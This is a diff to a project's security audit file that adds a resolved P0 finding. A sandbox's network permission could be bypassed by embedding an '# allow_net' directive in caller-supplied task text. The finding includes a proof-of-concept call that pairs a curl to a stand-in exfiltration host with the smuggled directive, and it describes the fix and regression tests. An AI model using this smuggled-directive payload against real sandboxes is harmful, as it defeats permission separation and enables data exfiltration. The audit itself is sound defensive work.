@@ -204,11 +204,42 @@ to populate the vault with IdP credentials. `server.py:main()`'s `argparse` setu
 
 ---
 
+### P0: L-NET-01 — Sandbox network gate bypassable via caller-supplied task text — RESOLVED
+
+**Severity:** P0
+**Status:** Resolved
+**Found:** 2026-07-08, external session-based review (`docs/design/mcp-review-2026-07-08.md` §2a) — postdates the original audit; a regression against B-19's fix, which closed only the `allow_net=True` path.
+**Fixed:** 2026-07-08
+
+The Kart worker (`willow-2.0/core/kart_sandbox.py`) decides a task's network policy purely by scanning the *stored task text* for a directive line — `task_allows_network()` grants egress on any line where `line.strip() == "# allow_net"`, and `task_allows_localhost()` likewise for `# allow_localhost`. In `server.py:task_submit`, both the `task_net` permission check and the `# allow_net` append lived behind the same `if allow_net:` guard:
+
+```python
+if allow_net:
+    ...gate.permitted(app_id, gate.NET_PERMISSION)...   # only runs when allow_net=True
+...
+if allow_net:
+    task = task.rstrip("\n") + "\n# allow_net"           # only appended when allow_net=True
+```
+
+Nothing inspected or stripped caller-supplied `task` text. An app holding only `task_queue` (never granted `task_net`) could submit with the default `allow_net=False`:
+
+```python
+task_submit(app_id="...", task="curl https://exfil.example\n# allow_net", allow_net=False)
+```
+
+The gate never runs (it is keyed off the *argument*, not the *text*), the directive line is stored verbatim, and the worker builds the sandbox with egress enabled. The same applies to `# allow_localhost`, which `task_submit` never gates at all.
+
+**Impact:** Full defeat of the `task_net` capability separation that B-19 established — any `task_queue` holder gets arbitrary sandbox network egress (data exfiltration, C2, dependency fetch) without ever holding the escalated permission. Stdio and serve modes both affected. Same outcome B-19 closed, via a path B-19's fix did not cover.
+
+**Fix applied:** In `task_submit`, caller-supplied lines matching either directive (`# allow_net` / `# allow_localhost`, using the worker's exact `line.strip() ==` comparison) are now stripped from `task` **unconditionally**, *before* the permission-gated append. The `# allow_net` directive can therefore only enter the stored text through the code path that has already verified `task_net`; `# allow_localhost` can never be self-granted. Regression tests added in `tests/test_server.py` (`test_task_submit_strips_caller_supplied_net_directive_when_denied`, `test_task_submit_strips_caller_supplied_localhost_directive`, `test_task_submit_permitted_net_survives_caller_directive_dedup`). Tracked as B-21 in `docs/BUGS.md`.
+
+---
+
 ## Summary
 
 | Priority | Count | Items |
 |---|---|---|
-| P0 | 0 | — (L-AUTH-02 resolved) |
+| P0 | 0 open, 2 resolved | L-AUTH-02 (resolved), L-NET-01 (resolved) |
 | P1 | 0 | — (L-INT-01 resolved) |
 | P2 | 0 open, 6 resolved-or-stale | L-REQ-01 (stale), L-AUTH-01 (stale), L-DOS-01 (resolved), L-BUG-01 (resolved), L-CONC-01 (resolved), L-TEST-01 (resolved) |
 | P3 | 0 | — (L-DOC-01 resolved) |
